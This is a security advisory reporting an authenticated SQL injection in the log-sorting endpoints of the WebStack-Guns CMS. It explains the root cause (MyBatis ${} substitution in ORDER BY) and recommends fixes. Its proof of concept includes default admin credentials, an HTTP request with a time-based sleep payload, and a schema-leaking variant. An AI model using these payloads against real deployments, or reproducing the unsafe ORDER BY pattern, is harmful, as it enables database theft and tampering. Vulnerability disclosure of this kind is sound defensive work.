# WebStack-Guns SQL Injection in Log Sorting (CWE-89)

- **Submitter**: sh7err@vEcho
- **Target Product**: WebStack-Guns (Spring Boot based bookmark CMS)
- **Affected Version**: 1.0 (current master)
- **Tested Environment**: commit `HEAD` of https://github.com/jsnjfz/WebStack-Guns on Java 8 / MySQL 5.7
- **Vulnerability Type**: Authenticated SQL Injection via dynamic ORDER BY
- **CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (Base 8.8)

## Summary
The administrative log viewers (`/log/list` and `/loginLog/list`) accept arbitrary `sort` parameters from the HTTP request and forward them through MyBatis `${}` substitution when building the `ORDER BY` clause. Because the application intentionally exposes a configurable sort feature, no validation or whitelist exists. Any authenticated administrator can therefore inject SQL expressions that execute with the application's database privileges.

## Component Overview
- `com.jsnjfz.manage.core.common.constant.factory.PageFactory#defaultPage` (src/main/java/com/jsnjfz/manage/core/common/constant/factory/PageFactory.java:34-52)
- `com.jsnjfz.manage.modular.system.controller.LogController#list` (src/main/java/com/jsnjfz/manage/modular/system/controller/LogController.java:69-76)
- `com.jsnjfz.manage.modular.system.controller.LoginLogController#list` (src/main/java/com/jsnjfz/manage/modular/system/controller/LoginLogController.java:67-74)
- `src/main/java/com/jsnjfz/manage/modular/system/dao/mapping/OperationLogMapper.xml:17-24`
- `src/main/java/com/jsnjfz/manage/modular/system/dao/mapping/LoginLogMapper.xml:14-21`

These modules were designed to give administrators client-side control over table sorting. The `sort` parameter is passed untouched from the UI to the database layer to support arbitrary column ordering, which unintentionally allows SQL fragments to reach the database server.

## Proof of Concept
1. Log into the WebStack-Guns administrator console (default credentials in README: `admin/111111`).
2. Request the operation log list with a malicious `sort` value:

```
GET /log/list?limit=10&offset=0&sort=(select%20sleep(5))%20--&order=asc HTTP/1.1
Host: victim
Cookie: rememberMe=... (or session cookie)
```

3. The resulting SQL statement rendered by MyBatis becomes:

```
select * from sys_operation_log ... order by (select sleep(5)) -- ASC
```

4. The database connection blocks for 5 seconds before returning the result, demonstrating successful injection. Replacing the payload with `(select database())` returns the current schema name inside the HTTP response. Similar payloads work against `/loginLog/list`.

## Root Cause Analysis
- `PageFactory.defaultPage` fetches `sort` and `order` directly from the HTTP request and stores them on the MyBatis `Page` object without filtering.
- `LogController` and `LoginLogController` pass `page.getOrderByField()` to their respective mapper methods without checking the field names.
- The MyBatis XML files embed `${orderByField}` inside `ORDER BY ${orderByField}` so the supplied string is concatenated into the SQL statement verbatim, bypassing prepared-statement protections.
- No whitelist or mapping of approved column names exists, so crafted SQL is executed with the application's database credentials.

## Impact
Any authenticated administrator (or an attacker who compromised such an account) can achieve arbitrary SQL execution within the WebStack-Guns database. This enables dumping or tampering with all portal data, altering user passwords, and potentially impacting availability via time-based payloads. Because the project ships with publicly documented default administrator credentials, remote exploitation is likely on un-hardened deployments.

## Recommended Remediation
1. Replace `${orderByField}` with safe enum-based mappings. Define a server-side whitelist of sortable columns and translate user-provided identifiers to known column names before building SQL.
2. Avoid string substitution in `ORDER BY`. Use MyBatis-Plus ordering helpers or implement conditional logic that appends the column tokens programmatically.
3. Disable or restrict default administrator credentials during initial setup to reduce exposure of authenticated attack vectors.

## References
- Source: https://github.com/jsnjfz/WebStack-Guns/blob/master/src/main/java/com/jsnjfz/manage/core/common/constant/factory/PageFactory.java#L34-L52

